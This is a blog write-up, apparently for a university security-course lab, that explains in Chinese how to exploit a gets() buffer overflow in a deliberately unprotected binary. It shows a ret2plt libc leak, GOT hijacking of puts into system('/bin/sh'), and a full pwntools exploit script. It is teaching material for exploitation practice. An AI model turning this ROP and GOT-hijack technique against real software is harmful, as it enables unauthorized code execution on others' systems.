<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  Simple PWN 0x34 (2023 Lab - ret2plt)
  #


  Background
  #

Got Hijack / BoF

  Source code
  #

//gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt
#include <stdio.h>
#include <stdlib.h>

int main(){
	char buf[20];
	setvbuf(stdout,0,2,0);
	printf(&#34;Try your best :&#34;);
	gets(buf);
	puts(&#34;boom !&#34;);	
}

  Recon
  #


checksec + file
$ checksec chal
[*] '/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ file chal
chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7ed984819a3908eff455bfcf87716d0fb298fac, for GNU/Linux 3.2.0, not stripped
首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去
還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
流程:
首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==
pop rdi ret
puts got address
puts plt
這三行的意思是把puts的got address，透過puts印出來給我們 -> puts(put自己的got address)
有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address
# leak puts got address to calculate libc base address
puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
libc_base = puts_addr - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.symbols['system']

現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有/bin/sh或是/sh的string，不過我們可以直接用同樣的方法，把字串送進去
# fetch user input -> /bin/sh\x00
pop_rdi_ret
bss_addr
gets_plt,
此時他就會像使用者要輸入，並把我們的輸入丟到bss address
另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
# fetch user input -> system address
pop_rdi_ret
puts_got
gets_plt
此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address
所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system
# system('/bin/sh\x00')
pop_rdi_ret
bss_addr
puts_plt



  Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
  #

from pwn import *

r = process('./chal')
# r = remote('10.113.184.121', 10053)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch = 'amd64'

pop_rdi_ret = 0x0000000000401263
puts_got = 0x403368
puts_plt = 0x401070
gets_got = 0x403378
gets_plt = 0x401090
bss_addr = 0x403f00
payload = flat(
    # leak puts got address to calculate libc base address
    pop_rdi_ret,    puts_got,
    puts_plt,

    # fetch user input -> /bin/sh\x00
    pop_rdi_ret,    bss_addr,
    gets_plt,

    # fetch user input -> system address
    pop_rdi_ret,    puts_got,
    gets_plt,

    # system('/bin/sh\x00')
    pop_rdi_ret,    bss_addr,
    puts_plt
)
raw_input()
r.sendlineafter(b'Try your best :', b'a' * 0x28 + payload)
print(r.recvline())

puts_addr = u64(r.recv(6).ljust(8, b'\x00'))
log.info(f&#34;puts address = {hex(puts_addr)}&#34;)

libc_base = puts_addr - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.symbols['system']
log.info(f'system address = {hex(system_addr)}')
r.sendline(b'/bin/sh\x00')
raw_input()
r.sendline(p64(libc.symbols['system']))

r.interactive()
"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Simple PWN 0x34 (2023 Lab - ret2plt)"><meta property="og:description" content="Simple PWN 0x34 (2023 Lab - ret2plt) # Background # Got Hijack / BoF
Source code # //gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt #include <stdio.h> #include <stdlib.h> int main(){ char buf[20]; setvbuf(stdout,0,2,0); printf(&#34;Try your best :&#34;); gets(buf); puts(&#34;boom !&#34;);	} Recon # checksec + file $ checksec chal [*] '/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) $ file chal chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f7ed984819a3908eff455bfcf87716d0fb298fac, for GNU/Linux 3.2.0, not stripped 首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去 還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看 流程: 首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt== pop rdi ret puts got address puts plt 這三行的意思是把puts的got address，透過puts印出來給我們 -> puts(put自己的got address) 有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address # leak puts got address to calculate libc base address puts_addr = u64(r.recv(6).ljust(8, b'\x00')) libc_base = puts_addr - libc.symbols['puts'] libc.address = libc_base system_addr = libc.symbols['system'] 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有/bin/sh或是/sh的string，不過我們可以直接用同樣的方法，把字串送進去 # fetch user input -> /bin/sh\x00 pop_rdi_ret bss_addr gets_plt, 此時他就會像使用者要輸入，並把我們的輸入丟到bss address 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking== # fetch user input -> system address pop_rdi_ret puts_got gets_plt 此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address 所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system # system('/bin/sh\x00') pop_rdi_ret bss_addr puts_plt Exploit - Ret2Plt(leak base address) + Got Hijack(call system) # from pwn import * r = process('./chal') # r = remote('10.113.184.121', 10053) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.arch = 'amd64' pop_rdi_ret = 0x0000000000401263 puts_got = 0x403368 puts_plt = 0x401070 gets_got = 0x403378 gets_plt = 0x401090 bss_addr = 0x403f00 payload = flat( # leak puts got address to calculate libc base address pop_rdi_ret, puts_got, puts_plt, # fetch user input -> /bin/sh\x00 pop_rdi_ret, bss_addr, gets_plt, # fetch user input -> system address pop_rdi_ret, puts_got, gets_plt, # system('/bin/sh\x00') pop_rdi_ret, bss_addr, puts_plt ) raw_input() r.sendlineafter(b'Try your best :', b'a' * 0x28 + payload) print(r.recvline()) puts_addr = u64(r.recv(6).ljust(8, b'\x00')) log.info(f&#34;puts address = {hex(puts_addr)}&#34;) libc_base = puts_addr - libc.symbols['puts'] libc.address = libc_base system_addr = libc.symbols['system'] log.info(f'system address = {hex(system_addr)}') r.sendline(b'/bin/sh\x00') raw_input() r.sendline(p64(libc.symbols['system'])) r.interactive()"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="Eductf"><meta property="article:tag" content="CTF"><meta property="article:tag" content="PWN"><title>Simple PWN 0x34 (2023 Lab - ret2plt) | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x34-2023-lab---ret2plt/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Simple PWN 0x34 (2023 Lab - ret2plt)</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---ret2pltleak-base-address--got-hijackcall-system>Exploit - Ret2Plt(leak base address) + Got Hijack(call system)</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=simple-pwn-0x34-2023-lab---ret2plt>Simple PWN 0x34 (2023 Lab - ret2plt)
<a class=anchor href=#simple-pwn-0x34-2023-lab---ret2plt>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>Got Hijack / BoF</p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>//gcc -no-pie -fno-stack-protector -z norelro ret2plt.c -o ret2plt
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(){
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>20</span>];
</span></span><span style=display:flex><span>	setvbuf(stdout,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Try your best :&#34;</span>);
</span></span><span style=display:flex><span>	gets(buf);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;boom !&#34;</span>);	
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><ol><li>checksec + file<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ checksec chal
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> <span style=color:#e6db74>&#39;/mnt/d/NTU/Second Year/Computer Security/PWN/Lab2/lab_ret2plt/share/chal&#39;</span>
</span></span><span style=display:flex><span>    Arch:     amd64-64-little
</span></span><span style=display:flex><span>    RELRO:    No RELRO
</span></span><span style=display:flex><span>    Stack:    No canary found
</span></span><span style=display:flex><span>    NX:       NX enabled
</span></span><span style=display:flex><span>    PIE:      No PIE <span style=color:#f92672>(</span>0x400000<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>$ file chal
</span></span><span style=display:flex><span>chal: ELF 64-bit LSB executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>f7ed984819a3908eff455bfcf87716d0fb298fac, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, not stripped
</span></span></code></pre></div>首先知道這隻binary是動態link library，所以可想而知，rop gadget一定少的可憐，所以我們不太能夠直接像上一題一樣暴力開一個shell出來，程式也沒有幫我們開，讓我們可以直接跳過去</li><li>還是有很明顯的BOF的漏洞，此時就可以嘗試類似got hijack的方式打看看
流程:</li><li>首先我們要知道libc base address才能夠利用扣掉offset的方式跳到system的地方，但是程式中並沒有能夠直接leak base address給我們的東西，因此我們可以自己想辦法leak: ==ret2plt==<pre tabindex=0><code>pop rdi ret
puts got address
puts plt
</code></pre>這三行的意思是把puts的got address，透過puts印出來給我們 -> puts(put自己的got address)</li><li>有了puts的got address之後，就可以扣掉puts在libc的offset，就可以知道base address，然後我們可以知道system的確切address<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># leak puts got address to calculate libc base address</span>
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_base
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span></code></pre></div></li><li>現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有<code>/bin/sh</code>或是<code>/sh</code>的string，不過我們可以直接用同樣的方法，把字串送進去<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># fetch user input -&gt; /bin/sh\x00</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>bss_addr
</span></span><span style=display:flex><span>gets_plt,
</span></span></code></pre></div>此時他就會像使用者要輸入，並把我們的輸入丟到bss address</li><li>另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># fetch user input -&gt; system address</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>puts_got
</span></span><span style=display:flex><span>gets_plt
</span></span></code></pre></div>此時我們可以輸入system的address，經過這三行後我們就成功把puts got address換成system got address</li><li>所有工具都準備好了，接下來只要呼叫puts就可以了，實際上就是呼叫system<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># system(&#39;/bin/sh\x00&#39;)</span>
</span></span><span style=display:flex><span>pop_rdi_ret
</span></span><span style=display:flex><span>bss_addr
</span></span><span style=display:flex><span>puts_plt
</span></span></code></pre></div></li></ol><h2 id=exploit---ret2pltleak-base-address--got-hijackcall-system>Exploit - Ret2Plt(leak base address) + Got Hijack(call system)
<a class=anchor href=#exploit---ret2pltleak-base-address--got-hijackcall-system>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#39;./chal&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># r = remote(&#39;10.113.184.121&#39;, 10053)</span>
</span></span><span style=display:flex><span>libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>arch <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;amd64&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x0000000000401263</span>
</span></span><span style=display:flex><span>puts_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x403368</span>
</span></span><span style=display:flex><span>puts_plt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401070</span>
</span></span><span style=display:flex><span>gets_got <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x403378</span>
</span></span><span style=display:flex><span>gets_plt <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x401090</span>
</span></span><span style=display:flex><span>bss_addr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x403f00</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> flat(
</span></span><span style=display:flex><span>    <span style=color:#75715e># leak puts got address to calculate libc base address</span>
</span></span><span style=display:flex><span>    pop_rdi_ret,    puts_got,
</span></span><span style=display:flex><span>    puts_plt,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fetch user input -&gt; /bin/sh\x00</span>
</span></span><span style=display:flex><span>    pop_rdi_ret,    bss_addr,
</span></span><span style=display:flex><span>    gets_plt,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># fetch user input -&gt; system address</span>
</span></span><span style=display:flex><span>    pop_rdi_ret,    puts_got,
</span></span><span style=display:flex><span>    gets_plt,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># system(&#39;/bin/sh\x00&#39;)</span>
</span></span><span style=display:flex><span>    pop_rdi_ret,    bss_addr,
</span></span><span style=display:flex><span>    puts_plt
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;Try your best :&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;a&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x28</span> <span style=color:#f92672>+</span> payload)
</span></span><span style=display:flex><span>print(r<span style=color:#f92672>.</span>recvline())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>puts_addr <span style=color:#f92672>=</span> u64(r<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;puts address = </span><span style=color:#e6db74>{</span>hex(puts_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc_base <span style=color:#f92672>=</span> puts_addr <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>]
</span></span><span style=display:flex><span>libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_base
</span></span><span style=display:flex><span>system_addr <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]
</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;system address = </span><span style=color:#e6db74>{</span>hex(system_addr)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;/bin/sh</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>raw_input()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(p64(libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;system&#39;</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---ret2pltleak-base-address--got-hijackcall-system>Exploit - Ret2Plt(leak base address) + Got Hijack(call system)</a></li></ul></nav></div></aside></main></body></html>